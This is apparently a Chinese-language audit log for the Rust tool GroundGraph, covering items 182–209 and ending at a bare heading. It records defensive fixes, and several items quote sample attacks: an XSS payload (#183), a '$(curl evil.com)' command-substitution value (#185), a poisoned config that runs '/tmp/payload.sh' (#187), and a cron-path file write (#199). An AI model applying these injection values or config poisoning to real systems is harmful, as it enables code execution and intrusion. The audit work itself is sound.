### 182. `port_coverage::analyze_port_coverage_with_stores` 的 `n.name.clone().unwrap()` 依赖隐式不变量

> **✅ 已闭环（2026-06-13 第八轮）** — 成立。`let name = n.name.clone().unwrap();` 改 `let Some(name) = n.name.clone() else { continue };`：DB 脏数据 / 上游过滤弱化时跳过无名节点而非 panic。`port_coverage::tests` 12 个用例全绿（happy path 不变）。

- **位置**：`crates/groundgraph-engine/src/port_coverage.rs:366-367`
- **问题**：循环 `n.name.clone().unwrap()`，安全性完全依赖 `eligible` 闭包过滤掉 `name=None`。一旦重构弱化 `eligible`，或 DB 脏数据 `name=NULL` 进入，立即 panic。
- **建议**：`let Some(name) = &n.name else { continue };`。

### 183. `webui/index.html` 多处 `node.kind` 直接拼 innerHTML/属性未走 `esc()`（与 #84 不同向量）

> **✅ 已闭环（2026-06-13 第八轮）** — 成立。5 处 `KIND_LABEL[...]||...kind` 与 `data-k="${k}"` 全部包裹 `esc(...)`（`esc()` 已含 `"`/`'` 转义，见 #84）。`data-k` 属性走 HTML 实体编码后由浏览器解析时自动解码，`row.dataset.k` 仍 round-trip 回原始 kind，过滤逻辑不受影响。

- **位置**：`webui/index.html:375, 407, 413, 449, 450`
- **问题**：`KIND_LABEL[node.kind]||node.kind` 直接拼到 innerHTML，`data-k="${k}"` 直接拼属性，均未走 `esc()`。攻击者构造 graph JSON `{"kind":"<img src=x onerror=alert(1)>"}` 即可在加载时执行任意 JS。与 #84（esc() 缺引号转义，已修）和 #39（graph_html innerHTML）不同：本条是 `node.kind` 字段完全未走 `esc()` 的新向量。
- **建议**：所有 `KIND_LABEL[...]||...` 包裹 `esc(...)`；`data-k="${esc(k)}"`。

### 184. `time 0.3.41` 命中 RUSTSEC-2026-0009 / CVE-2026-25727（栈耗尽 DoS，影响 < 0.3.47）

> **✅ 已闭环（2026-06-13 第八轮）** — 成立。`cargo update -p time --precise 0.3.47`（连带 `deranged`/`num-conv`/`time-core`/`time-macros` 升级），脱离受影响区间。零代码改动；clippy 全绿、构建通过。CI 加 `cargo audit` 归并到 #102 跟踪。

- **位置**：`Cargo.lock:1130-1131`（`time 0.3.41`）；使用点 `business_candidates.rs:41-42`、`graph.rs:47`
- **问题**：GroundGraph 锁定的 `time 0.3.41` 落在受影响区间 `>=0.3.6, <0.3.47`。当前仅用 `OffsetDateTime::now_utc().format(&Rfc3339)` 做格式化（无解析入口），利用面有限；但依赖打包进发布二进制（dist/groundgraph-0.2.0-macos-universal）。一旦未来某路径开始解析时间戳（如 candidates.yaml 的 `reviewed_at`），立即变成可触发 DoS。#102 已记录"CI 无 cargo audit"——本应自动报警却被静默。
- **建议**：`cargo update -p time --precise 0.3.47`；CI 加 `cargo audit`（与 #102 合并）。

### 185. `release_scan.sh` 内联 `python3 -c` 的 `$REPORT` 路径在双引号 Python 字符串内裸插值（#85 漏报维度）

> **✅ 已闭环（2026-06-13 第十一轮）** — 与 #85 同因同修。单引号 Python 源码 + argv 传参杜绝 shell 在双引号串内对 `$REPORT` 的任何求值（含 `$(...)`/反引号/`;`），路径仅经 `sys.argv` 传入。验证同 #85（旧写法 `SyntaxError`、新写法计数正确）。

- **位置**：`scripts/release_scan.sh:155-157`
- **问题**：`NODE_COUNT=$(python3 -c "...open('$REPORT/graph-code.json')...")`。#85 处理的是"单引号破裂"，但 `$REPORT` 在**双引号 Python 字符串内被 shell 裸插值**——攻击者用 `$(...)`、反引号、`;` 仍能注入。例如 `NAME='$(curl evil.com)'` 让 `$REPORT` 含命令替换，shell 在双引号内求值。
- **建议**：移到独立 `.py` 脚本，argv 传 `--report "$REPORT"`；彻底避免 shell 插值进 Python 源码。

### 186. `docs_indexer` / `lsp_indexer` / `treesitter` 多处 `read_to_string` 无大小上限（#67 未覆盖的独立路径）

> **✅ 已闭环（2026-06-13 第九轮）** — 成立（独立于 #67）。4 处全部接入 `source_text::is_oversized_source` OOM 门：`lsp_indexer.rs:213/762`（本轮新加，主路径 push partial warning、SCIP 路径静默 `continue`）；`docs_indexer.rs:364` 与 `treesitter.rs:1473` 经核实已有门。并**顺带加固** `schema_indexer` 同类读取：在其 WalkDir 单文件循环顶部统一加门，覆盖 XML mapper / 路由扫描 / Dart·TS consumed-call / DDL `read_and` 全部 `read_to_string`。`config`/requirements 受控小文件保持原样（不应静默跳过）。clippy 0 警告，engine 716 lib + 扫描穷尽性 proptest 全绿。

- **位置**：`docs_indexer.rs:367`、`lsp_indexer.rs:213, 762`、`treesitter.rs:1477`
- **问题**：#67 已给 treesitter/fulltext par_iter 加了 `is_oversized_source` 容量门，但这 4 处独立的单文件 `read_to_string` 仍无大小检查。一个 8 GB vendored 文件、生成的 `.g.dart`、minified bundle 会让 `read_to_string` 一次性分配对应 String，OOM-kill。`search.rs::read_snippet_lines` 有 `SNIPPET_MAX_FILE_BYTES=2MiB` 防御，证明项目意识到风险——但这 4 处漏了。
- **建议**：抽 `read_capped_source(path, max_bytes)` helper，4 处全部接入。

### 187. `.groundgraph.yaml` 的 `*_command` 字段无白名单 → 配置即任意代码执行入口

> **✅ 已闭环（2026-06-13 第十三轮，TDD）** — 成立但攻击面已收窄到**单一仓库可控入口**：审计三处命令源，SCIP bin（`GROUNDGRAPH_SCIP_*_BIN` env 或 PATH 查找知名 indexer 名）与 Dart sidecar（`GROUNDGRAPH_DART_ANALYZER_BIN` env，默认 `dart run <内置>`）均为**算子可控**（非仓库投毒向量）；唯一**仓库可控**的可执行串是 `config.swift.lsp_command`（`index.rs:237`）。修复：新增纯策略函数 `resolve_config_command(trusted, field, value)` + 环境读取包装 `config_command(...)`，仓库 config 提供的命令**默认不执行**，仅当算子显式 `GROUNDGRAPH_TRUST_CONFIG_COMMANDS=1` 信任工作区时才放行；被忽略时打印可见 stderr 提示（含被弃命令值 + 开启方法）。算子 env 覆盖（`GROUNDGRAPH_SWIFT_LSP_BIN`）天然绕过该门。这也使 #133 文档"lsp_command 默认被忽略"成为事实。验证：`config_command_is_dropped_unless_workspace_is_trusted`（untrusted 丢弃+提示含 env 名、trusted 放行无提示、None no-op）通过；engine lib clippy 0 警告。建议(c)「拒相对/`..` 路径」未采纳：信任门已封死仓库向量，算子 env 路径无需再限。

- **位置**：`lsp_indexer.rs:125-128`（`lsp_command` → `Command::new`）、`dart_sidecar.rs:308-310`（`GROUNDGRAPH_DART_ANALYZER_BIN`）、`scip_runner.rs:151, 222`（各 SCIP `*_BIN` env）
- **问题**：GroundGraph "非侵入式" 承诺是核心卖点，但 `.groundgraph.yaml` 是目标仓控制的文件。index 阶段把 `swift.lsp_command`（或同名其他语言字段、环境变量）原样作为可执行程序路径调用 `Command::new(...).spawn()`，**无白名单、无签名校验**。攻击者投毒目标仓 `.groundgraph.yaml` 写 `swift: lsp_command: /tmp/payload.sh`，受害者 clone 后运行 `groundgraph index` 即以受害者身份执行任意代码。
- **建议**：(a) 启动时打印所有非默认 `*_command` 到 stderr；(b) 提供 `--trust-config` flag，未设置时遇到非默认值报错退出；(c) 拒绝相对路径与含 `..` 的路径。

### 188. `source_hash` 列被 schema/struct/SQL 全链路定义，但任何 indexer 从不写入——纯写放大 + schema 谎言

> **🟠 判定：成立·待专项（2026-06-13 第十四轮·Wave C，已验证）** — 成立。本轮确认 `.source_hash = Some(..)` 仅 `repositories.rs:1226`（测试），`nodes.source_hash`/`edge_assertions.source_hash` 恒 NULL。修法同 #152：(a) 接通＝indexer 计算 `sha256(content)`，需先定义"content"粒度（节点源码区间 vs 整文件）属功能设计；(b) 删列＝对热表 `nodes`/`edge_assertions` 做 table-rebuild 迁移 + 改 SQL/struct/decode 四处。运行期成本仅每行多写一个 NULL，risk≫benefit。归入「schema 演进专项 PR」。

> **✅ 已闭环（2026-07-17，TDD）** — 与 #152 同一迁移 005 table-rebuild 去掉 `source_hash`（两表各 13→11 / 14→12 列），`Node`/`EdgeAssertion` 删字段并跟进 `repositories.rs` 全链路（SQL/参数/decode/列常量）。迁移测试覆盖列消失 + 数据保留 + 幂等；全 workspace clippy 0 告警、测试全绿。

- **位置**：schema `001_initial.sql:15,32`；struct `node.rs:526`、`edge.rs:183`；SQL `repositories.rs:112,193,209,254,268`；decode `repositories.rs:669,690`
- **问题**：grep 全工程 `\.source_hash` 命中 0 处赋值——除了 SQL 模板和测试构造。`nodes.source_hash` 与 `edge_assertions.source_hash` **永远是 NULL**，但每行 upsert 仍多写一个 NULL Value，多扫一个参数列。文档多次提到"source hash 追踪"，代码层面未兑现。与 issues3 #152（`index_generation` 从不查询）是姊妹问题：一个"定义了不写"，一个"写了不查"。
- **建议**：(a) 接通：indexer 写入 `sha256(content)`；(b) 删除：从 schema/struct/SQL/decode 四处移除。

### 189. `docs_indexer` 写 `File`/`DocSection` 节点时不设 `source_file`，与 `requirements_md_indexer`/`schema_indexer` 不一致

> **✅ 已闭环（2026-06-13 第九轮）** — 成立（一致性）。`docs_indexer` 的 `file_node` 与 section `node` 构造均补 `source_file = Some(rel_path.to_string())`，与 `requirements_md_indexer`/`schema_indexer` 对齐，使审计 / UI 源文件链接 / file-scoped 过滤一致工作。`docs_indexer` 单测全绿。

- **位置**：`docs_indexer.rs:378-409`
- **问题**：对比 `requirements_md_indexer.rs:135`（`node.source_file = Some(rel.clone())`）、`schema_indexer.rs:946,967`（同），`docs_indexer` 的 `file_node` 和 section `node` 都不写 `source_file`。后果：审计/调试时无法回答"这个 DocSection 来自哪个文件"，UI 无法显示源文件链接，无法做 file-scoped 过滤。
- **建议**：两处 node 构造加 `node.source_file = Some(rel_path.to_string())`。

### 190. `index_generation` 列在生产 indexer 中从未被写入（#152 的姊妹问题）

> **🟠 判定：成立·待专项（2026-06-13 第十四轮·Wave C，#152 姊妹，已验证）** — 成立，与 #152 同源（"写了不查" vs "查不到因为没写"）。本轮确认所有生产 indexer 省略 `index_generation = Some(..)`（仅测试写入）。处置同 #152：接通需 generation-fence 功能（`current_generation()` + run_index bump），删列需热表 table-rebuild 迁移。归入「schema 演进专项 PR」，不在散修轮处理。

> **✅ 已闭环（2026-07-17，TDD）** — 与 #152 同源同解：迁移 005 table-rebuild 删除 `nodes`/`edge_assertions` 的 `index_generation` 列，`Node`/`EdgeAssertion` 删字段，生产 indexer 此前本就省略该字段故无生产构造点需改。`file_index.index_generation`（增量索引在用）保留不动。

- **位置**：所有生产 indexer（`ingest_language_batch_minimal`、`docs_indexer`、`schema_indexer`、`scip_overlay`、`requirements_md_indexer`、`links_indexer`）全部省略 `node.index_generation = Some(...)`
- **问题**：issues3 #152 已指出 `index_generation` 不在 WHERE——但它**也不在 SET/VALUES 里**（除测试）。schema 宣称支持"按 generation 增量清除/读取"（PRD §5），代码根本没接通。`slice_cache.index_generation NOT NULL` 是死约束（表本身也是死代码，见 #151）。
- **建议**：在 `Store` 上引入 `current_generation()`，由 `index.rs::run_index` 在 `begin_bulk` 后 bump；或从 schema/SQL/struct 删除。

---

## Medium（15 个）

### 191. MCP `explain_symbol` 的 `as_array_mut().expect("array")` 依赖 entry-or-insert-with 不变量

> **✅ 已闭环（2026-06-13 第九轮）** — 成立（防御性）。两段 `entry(k).or_insert_with(|| Value::Array(...)).as_array_mut().expect("array")` 改 `if let Value::Array(arr) = entry { arr.push(...) }`：entry 恒为 Array，`else` 不可达，但未来该 map 填充方式变更时降级为丢一行而非 panic 整个 MCP tool 调用。`explain_symbol` 测试全绿。

- **位置**：`crates/groundgraph-mcp/src/tools/explain_symbol.rs:107-117, 119-128`
- **问题**：两段 `entry(k).or_insert_with(|| Value::Array(Vec::new())).as_array_mut().expect("array")`。若同一 `edge_kind` 曾以非 Array 形式插入，`expect` 立即 panic，整个 MCP tool 调用失败。
- **建议**：`if let Value::Array(arr) = ... { arr.push(...) } else { tracing::warn!(...) }`。

### 192. `requirements_md_indexer` 的 `Section::Body => unreachable!()` 在新增 enum variant 时静默丢失

> **🟡 判定：不成立（按设计，2026-06-13 第九轮）** — `Section::Body => unreachable!()` 处于**无 `_` 通配的穷尽 match**：新增 enum variant 会触发**编译错误**（E0004），而非静默丢失。建议的 `_ => {}` 反而**削弱**这一编译期保护，让新 variant 被静默吞掉。`unreachable!` 已注明前置过滤保证 Body 不到达此分支。不改。

- **位置**：`requirements_md_indexer.rs:346-353`
- **问题**：外层 `Section::Docs | Impl | Test` 收窄后内层对 `Body` 用 `unreachable!()`。一旦给 `enum Section` 新增 variant（如 `Acceptance`），外层 `|` 模式不自动包含，新 variant 被静默跳过——需求验证项丢失，connect/checks 报告假性 100% 覆盖。内层无 `_ =>` 兜底，编译器无法捕获漂移。
- **建议**：内层改 `_ => unreachable!("outer arm restricts to Docs/Impl/Test")`；外层显式列出新 variant。

### 193. `graph` CLI 的 `GraphFormat::Web => unreachable!("web handled above")` 同类不完整 match

> **🟡 判定：不成立（按设计，2026-06-13 第九轮）** — `GraphFormat::Web => unreachable!("web handled above")`：Web 分支在函数更早处提前 `return`（因其绕过 `build_graph_view` 的通用导出路径），到达此 match 时 Web 已不可能。`unreachable!` 带说明消息且 match 穷尽（无 `_`），新增 format 仍是编译错误而非静默落空。同 #192，不改。

- **位置**：`crates/groundgraph-cli/src/commands/graph.rs:82-87`
- **问题**：顶部 `if format == Web { return emit_web(...) }` 提前返回，底部 match 用 `unreachable!`。`if` 不被编译器强制，重构时易破坏守卫。
- **建议**：去掉提前 return，match 内直接处理 Web 分支。

### 194. MCP `search_graph` 的 `file.expect("file present")` 依赖上游校验顺序

> **✅ 已闭环（2026-06-13 第八轮）** — 成立（防御性加固，当前守卫成立但脆弱）。`file.expect(...)` 改 `let Some(path) = file else { bail!(...) }`，错误消息可操作。MCP `protocol.rs` 8 个集成测试全绿。

- **位置**：`crates/groundgraph-mcp/src/tools/search_graph.rs:118-129`
- **问题**：`expect` 安全性依赖前面 `bail!` 的 count==1 校验。一旦重构放松校验，立即 panic；错误消息 "file present" 给调用方零信息。
- **建议**：`let Some(path) = file else { bail!("...") };`。

### 195. MCP `context_pack` 的 `symbol_id.expect("checked above")` 同类契约

> **✅ 已闭环（2026-06-13 第八轮）** — 成立（同 #194 防御性）。`symbol_id.expect("checked above")` 改 `let Some(sym) = symbol_id else { bail!("supply exactly one of …") }`。

- **位置**：`crates/groundgraph-mcp/src/tools/context_pack.rs:93-97`
- **问题**：同 #194 模式。`expect` 消息 "checked above" 给调用方零信息，重构脆弱。
- **建议**：`let Some(sym) = symbol_id else { bail!("...") };`。

### 196. `scip_runner::run_with_capped_stderr` 的 `child.stderr.take().expect("stderr was requested as piped")`

> **✅ 已闭环（2026-06-13 第八轮）** — 成立（防御性）。`expect(...)` 改 `.ok_or_else(|| std::io::Error::other("stderr pipe missing despite Stdio::piped()"))?`；函数本就返回 `io::Result`，fd 耗尽 / 未来改 `inherit()` 时返回错误而非 panic。

- **位置**：`scip_runner.rs:619-621`
- **问题**：理论上 `Stdio::piped()` 后 `stderr` 必为 Some，但 fd 耗尽等边缘条件下 `take()` 可能失效；未来重构改 `Stdio::inherit()` 也会 panic。
- **建议**：`.ok_or_else(|| anyhow!("..."))?`。

### 197. `dart_sidecar::command_from_str` 用 `split_whitespace` 切 argv，忽略引号/转义/`$()`

> **✅ 已闭环（2026-06-13 第八轮，TDD 修复）** — 成立。抽出 `split_command()` 用 `shlex::split`（已加 `shlex = "1.3"` 到 workspace 依赖，原为传递依赖，无新增供应链面），引号/转义路径正确切分；不平衡引号回退到 `split_whitespace` 不 panic。新增测试 `dart_sidecar::tests::split_command_honours_quotes_and_falls_back_safely`。注：仅修「解析」，`$()` 命令替换不会被执行（直接 `Command::new` argv，无 shell），与 #187 的信任面是不同维度。

- **位置**：`dart_sidecar.rs:333-340`
- **问题**：`GROUNDGRAPH_DART_ANALYZER_BIN='/path/with space/dart'` 被切成 `[/path/with, space/dart']`。文档说"shell-style command"，实际不是。`shlex 1.3.0` 已在 Cargo.lock 但未用。
- **建议**：`shlex::split(raw)` 替换 `split_whitespace`。

### 198. `business_candidates::apply_review` 写回 YAML 无文件锁，并发 review 产生 lost update

> **✅ 已闭环（2026-06-13 第十轮，TDD）** — 成立（lost update）。`apply_review` 对 sidecar `business_logic.yaml.lock` 取 `std::fs::File::lock()` 独占顾问锁，串行化整个 read→mutate→write（`write_atomic` 只保证 replace 原子，丢更新窗口跨 read..write）。新增并发测试 `apply_review_is_serialized_across_concurrent_reviewers`（Barrier 同步 N 线程，断言全部 verdict 不丢）。

- **位置**：`business_candidates.rs:392-402`
- **问题**：`apply_review` 先读再改再 `write_atomic`。`write_atomic` 只保证原子替换，不保证读-改-写原子性。CI 并发跑两条 `groundgraph candidate review` 时，后写覆盖先写，verdict 丢失。
- **建议**：`fd.lock_exclusive()`（fs2/fs4 crate），drop 自动释放。

### 199. `connect::apply_candidates` 的 `manifest_abs` 完全信任 `.groundgraph.yaml` 的 `links.path`，绝对路径任意写

> **✅ 已闭环（2026-06-13 第九轮，TDD 修复）** — 成立（安全/路径穿越）。新增 `confine_manifest_path(repo_root, links.path)`：拒绝绝对路径与含 `..` 的 `links.path`，使被污染的目标仓 `.groundgraph.yaml` 无法让 `connect apply` 写到仓外（如 `/etc/cron.d/...`）。新增单测 `confine_manifest_path_rejects_traversal_and_accepts_relative`（绝对 / `..` / 嵌套 `..` 全拒、合法相对路径通过；修复前 RED）。

- **位置**：`connect.rs:358-365`
- **问题**：`.groundgraph.yaml` 写 `links: path: /etc/cron.d/payload`，下一次 `groundgraph connect apply` 就把 candidates YAML 写到 `/etc/cron.d/payload`。`atomic_write.rs:22` 还会 `create_dir_all` 创建沿途目录。
- **建议**：`manifest_abs.canonicalize()?` 必须 `starts_with(repo_root.canonicalize()?)`。

### 200. `scip_runner::execute` 把 `cwd` 设为 `repo_root`，子进程对整个目标仓有读写权限（违反非侵入式承诺）

> **🟡 判定：已知权衡（2026-06-13 第九轮）** — 把子进程 cwd 设为 `repo_root` 是 SCIP 索引器（`scip-python`/`scip-java`/`rust-analyzer`）正常工作的**必要条件**（需在仓根解析依赖/配置）。"非侵入"指不写注解到目标源码，而非禁止子进程读目标仓；副作用目录（`target/`、`__pycache__/`）已由 `release_scan.sh` 走 scratch 副本兑现零副作用。属已知、有意的信任权衡，建议（b）tempdir+绝对 output 列为可选专项。本轮不改。

- **位置**：`scip_runner.rs:546-558`
- **问题**：SCIP indexer（`scip-python`/`scip-java`/`rust-analyzer`）会创建 `__pycache__/`、`target/`、`build/` 等副作用目录。`release_scan.sh` 用 rsync 复制到 scratch 才兑现零副作用承诺；直接 `groundgraph index` 污染目标仓。
- **建议**：(a) 文档明确"index 可能有副作用目录，用 release_scan.sh 走 scratch 副本"；(b) cwd 改 `tempdir()` + `--output` 绝对路径。

### 201. `search::shell_quote` 跨 shell 失效——`top.id` 拼进命令字符串，fish/PowerShell 转义不一致

> **🟡 判定：不成立（当前安全，2026-06-13 第九轮）** — `shell_quote` 把 `top.id` 拼进展示用命令串。当前 `ArtifactId` 字符集（语言 / 路径 / 名以 `::` 连接，slugify 后为 `[a-z0-9-]`）是 **POSIX 安全**的，无 shell 元字符，单引号包裹即安全；issue 自身也承认"当前 ArtifactId 字符集受限"。属理论隐患而非现行 bug；若未来放宽 id 字符集（含 `'` 等）再专项换结构化输出。本轮不改。

- **位置**：`search.rs:1983-2000`
- **问题**：`shell_quote` 是 POSIX sh 转义，但生成的命令被复制到 fish/PowerShell/cmd.exe 时转义失效。当前 ArtifactId 字符集受限，未来扩展含 `'` 时风险升高。
- **建议**：换成结构化数据（JSON 字段 `suggested_focus`），由调用方组装命令。

### 202. `indexed_at` (datetime('now')) vs `generated_at` (RFC3339) 时间格式不一致

> **✅ 已闭环（2026-06-13 第十四轮·Wave C，TDD 修复；含一处指控订正）** — 部分成立。**(a) `schema_version.applied_at` 成立并已修**：原 `DEFAULT (datetime('now'))` 产出 `2026-06-13 18:28:26`（空格分隔、无 Z），非 RFC3339。改为 `strftime('%Y-%m-%dT%H:%M:%SZ','now')`，并在 `INSERT INTO schema_version(version, applied_at)` 中显式写入同一 `strftime`，使**即便列默认值仍是旧格式的老库**（`CREATE TABLE IF NOT EXISTS` 不会改既有列默认）记录的新行也是规范格式。新增单测 `apply_list_records_applied_at_as_rfc3339_utc`（依赖无依赖的 `is_rfc3339_utc` 形状校验，修复前实测 RED：`2026-06-13 18:28:26`）。**(b) `file_index.indexed_at` 指控不实**：`001_initial.sql:65` 是 `indexed_at TEXT NOT NULL`——**无** `datetime('now')` 默认，值由调用方提供；且 grep 全工程 `upsert_file_index` 仅测试调用（`repositories.rs` 测试用 RFC3339、`logic_confidence.rs:599` 测试用占位串），无生产写入路径，不存在跨表格式漂移。`GraphViewModel.generated_at` 本就是 RFC3339，无需改。

- **位置**：`migrations.rs:39` vs `graph.rs:398`
- **问题**：`schema_version.applied_at`、`file_index.indexed_at` 走 `datetime('now')` → `2026-06-13 12:34:56`（无 T、无时区）；`GraphViewModel.generated_at` 走 RFC3339 → `2026-06-13T12:34:56Z`。跨表 JOIN 排序时字典序错乱（`T` 排在空格后），客户端误把无 Z 的时间当本地时间会偏 8 小时。
- **建议**：所有持久化时间字段统一 RFC3339 UTC；或迁移里 `DEFAULT (strftime('%Y-%m-%dT%H:%M:%SZ','now'))`。

### 203. `slugify` 对 emoji/非 ASCII 标题可能产生 ID 碰撞

> **✅ 已闭环（2026-06-13 第九轮，TDD 修复）** — 成立。`slugify` 在剥离非 ASCII（emoji/CJK）后，若确有非 ASCII 字符被丢弃则附加 `fnv1a64` 内容 hash 后缀，使仅差非 ASCII 的两个标题（`Rocket 🚀` vs `Rocket 🚀🚀`、`登录 login` vs `登出 login`）不再塌缩并互相 UPSERT；纯 ASCII slug 保持不变。新增单测 `slugify_disambiguates_mixed_ascii_and_non_ascii_collisions`（修复前 RED），把 #53（纯 CJK fallback）推广到混合 ASCII+非 ASCII 场景。

- **位置**：`artifact_id.rs:98-118`
- **问题**：`slugify("Rocket 🚀")` 走"非空 ascii"分支返回 `"rocket"`；`slugify("Rocket 🚀🚀")` 同样返回 `"rocket"`——碰撞。两个不同 doc section 抢同一 ID，UPSERT 互相覆盖。`#53` 修了纯 CJK 的 fallback hash，但 emoji+ASCII 混合仍会碰撞。
- **建议**：输入含任何非 ASCII 字符时附加 hash 后缀：`format!("{slug}-{hash:x}")`。

### 204. `Node.start_line` 可空 vs `SymbolRange.start_line` NOT NULL——NULL 语义不一致

> **✅ 已闭环（2026-06-13 第九轮）** — 取 issue 建议的第二方案修复**具体 bug**：`scip_overlay::innermost_containing` 加 `r.start_line > 0` 过滤——行号 1-based，`start_line==0` 是退化哨兵（如 external `DbTable` range），否则会"包含"任意行、误归属 SCIP calls 边。`scip_overlay` 单测全绿。（更广的两表 NULL 语义统一为 schema 重构，列入存储专项，不阻塞此修复。）

- **位置**：`001_initial.sql:11,12` vs `53,54`；decode `repositories.rs:663-664` vs `729-730`
- **问题**：同一概念两表 NULL 语义不同。SCIP overlay 的 `innermost_containing` 用 `r.start_line <= line`，若 `DbTable`（external）`start_line=0` 写进 symbol_ranges，永远命中"包含所有行"——错误归属 calls 边。
- **建议**：`SymbolRange.start_line` 改 `Option<u32>` 或 `innermost_containing` 过滤 `r.start_line > 0`。

### 205. `EdgeAssertion` ID 不含 `source`/`certainty`/`status`，跨 indexer 不同 source 互相覆盖（#62/#78 的广义版本）

> **🟠 判定：成立·待专项（2026-06-13 第十四轮·Wave C，已验证）** — 成立（潜在正确性）。本轮读 `edge.rs:217` 确认 ID＝`edge::{kind}::{from}::{to}`，不含 source/certainty/status；`repositories.rs:226/256` 的 `ON CONFLICT(id) DO UPDATE SET source=excluded.source, certainty=excluded.certainty, …` 会让后写同 `(kind,from,to)` 的不同 source 边整行覆盖前者（含 certainty 降级）。但稳健修法是带涟漪的**边身份契约变更**：(a) 把 source/certainty 纳入 ID＝改变全工程边去重语义、破坏既有库的边 ID、牵动所有按 ID 读写的路径；(b) `ON CONFLICT … WHERE excluded.certainty >= edge_assertions.certainty` 需把 TEXT 存储的 certainty 枚举映射为数值序（字典序≠语义序），且只解决"不降级"一面、不解决 source provenance 丢失。注：与 Wave A 已闭环的 #62/#78（SCIP/heuristic 覆盖，走 indexer 标记 + 抑制模型解决）正交。需独立设计 PR，列为专项。

> **✅ 已闭环（2026-07-17，TDD）** — 边身份契约改为 **身份 = kind + source + from + to**：`EdgeAssertion::declared` 的 ID 由 `edge::{kind}::{len}:{from}::{to}` 改为 `edge::{kind}::{source}::{len}:{from}::{to}`（source 在 kind 之后，长度前缀防撞不动），同 `(kind,from,to)` 不同 source 的边现可共存、不再互相覆盖。**certainty/status 不进 ID**——它们是同一断言的可变状态而非身份，进 ID 会在 certainty 升级时产生孤儿行。防降级：两处 edge UPSERT 的 `ON CONFLICT(id) DO UPDATE` 用 `CASE WHEN excluded.certainty='fact' OR edge_assertions.certainty='declared' THEN excluded ELSE 原行 END` 显式表达「只升不降」（不依赖字典序巧合），confidence 走同一条件保持 certainty/置信度一致，其余 provenance 字段照常覆盖。既有库的旧格式 ID 行靠下次 `groundgraph index` 时各 indexer 的 `clear_indexer_outputs` 自然清理（不在迁移期改写数据）。TDD：core ID 测试（不同 source 不同 ID、确定性、#251 防撞继续过）+ store 测试（共存、declared 不覆盖 fact、fact 可覆盖 declared）先红后绿。

- **位置**：`edge.rs:191-218`
- **问题**：`format!("edge::{}::{}::{}", kind, from, to)`。`docs_indexer`（source=`Markdown`）与 `requirements_md_indexer`（source=`ExternalManifest`）可能写相同 `Documents(doc_section, requirement)` 边，第二条 UPSERT 覆盖第一条的 source 字段。与 #62（SCIP/heuristic 覆盖）和 #78（同上）不同：本条关注**跨数据源的 source/certainty/status 覆盖**。
- **建议**：把 `source` 与 `certainty` 纳入 ID 哈希；或 UPSERT 的 ON CONFLICT 加 `WHERE excluded.certainty >= edge_assertions.certainty`。

---

## Low（5 个）

### 206. 多处生产 unwrap 依赖上游守卫的"过滤位置漂移"风险（汇总 8 处）

> **✅ 已闭环（2026-06-13 第十四轮·Wave E，防御性加固）** — 成立但**无实活 bug**：逐一核实 8 处中 7 处现仍有上游守卫（短路/`len` 检查），`search.rs:238` 的生产 unwrap 已被既往重构消除（仅测试残留）。按守卫与 unwrap 的**距离**分两策处理：① **守卫远离**（重构最易漂移）的 4 处改为不可 panic 形式——`is_plausible_table_name` `chars.next().unwrap()`→`let Some(first)=… else {return false}`；`parse_java_field` `tokens.last().unwrap()`→`tokens.last()?`；`is_ident` `chars().next().unwrap().is_ascii_digit()`→`starts_with(|c| c.is_ascii_digit())`；`slugify` `chars().next().unwrap()`→`starts_with(|c| c.is_ascii_alphanumeric())`。② **守卫紧邻**（同一 `if` 上一行、低漂移风险）的 3 处按 issue 建议「至少文档化不变量」改 `.expect("…verified above")`——`treesitter` 的 `parts.first()/last()`（`len>=2`）与 `distinct_files.iter().next()`（`len==1`）；`business_pack` community 处本就是 `.expect("len checked")`。全部**行为不变**（空/退化输入返回与守卫一致的值）。TDD（特征化）：新增 `is_ident_handles_degenerate_inputs`、`parse_java_field_rejects_degenerate_lines`，并给 `external_table_name_plausibility`（`"ab"`）/`slugify_sanitises_to_candidate_id`（`""`/`"___"`）补边界——改动前后均绿，证明语义保持。engine clippy 0 警告（含 `?` 化）、`cargo test -p groundgraph-engine --lib` 733 passed/0 failed。

- **位置**：`schema_indexer.rs:1445,1763,3676`、`business_pack.rs:1418,2145`、`treesitter.rs:1752,1822`、`search.rs:238`
- **问题**：8 处 unwrap/expect 当前有上游守卫，今天不 panic，但守卫与 unwrap 在不同函数甚至不同文件，重构极易破坏。panic safety 最佳实践：unwrap 替换为 `let Some(x) = … else { return … }`。
- **建议**：逐一替换为 explicit 控制流；至少 `debug_assert!` 文档化不变量。

### 207. `ensure_query_indexes` 每次 `open()` 都跑 6 个 `CREATE INDEX IF NOT EXISTS`，冷启动开销

> **🟡 判定：基本按设计（2026-06-13 第九轮，与 #179 同源）** — 见 #179：每次 `open()` 跑 `CREATE INDEX IF NOT EXISTS` 是有意的自愈机制，`IF NOT EXISTS` 在已建索引库上近乎零成本，冷启动 5-10ms 可忽略。不改。

- **位置**：`lib.rs:120,129-136`
- **问题**：已建索引的库上仍是 no-op，但每次 open 都做 sqlite_master 查询 + 6 个 CREATE INDEX 解析，约 5-10ms。对 search/slice 这类短命令是纯开销。
- **建议**：一次性 `SELECT name FROM sqlite_master WHERE type='index'` 检查存在性后再 batch；或 lazy 化。

### 208. `NodeKind::language()` 用 13 次 `strip_prefix`，顺序敏感且无全枚举测试

> **✅ 已闭环（2026-06-13 第八轮，测试补全）** — 部分成立。代码经核实**当前正确**：`strip_prefix(lang)` 后强制 `strip_prefix('_')`，故 `cpp_*` 永不被 `c` 误匹配（`"cpp_x"` 去 `c` 余 `"pp_x"` 不以 `_` 开头），顺序其实非脆弱点；真正缺口是**无全枚举测试**。新增 `node::tests::language_round_trips_for_every_kind`：遍历 `NodeKind::ALL`，断言 `language()` 等于「最长 `<lang>_` 前缀」分析结果，并固定 `cpp`/`c` 哨兵。未改生产代码（避免 `split('_')` 重写引入「`docs_section`→`Some("docs")`」回归）。

- **位置**：`node.rs:291-315`
- **问题**：`['dart','swift',...,'cpp','c']` 顺序敏感（`cpp` 必须在 `c` 之前）。当前正确，但前缀冲突的隐式契约脆弱。`node.rs:683` 测试只覆盖 9 个抽样，无全枚举 round-trip。
- **建议**：改成 `s.split('_').next()` 一次匹配；或写 property test 覆盖全部 NodeKind。

### 209. MCP `dispatch` 出站 JSON 无大小上限，超大响应让 `serde_json::to_string` 分配大块内存

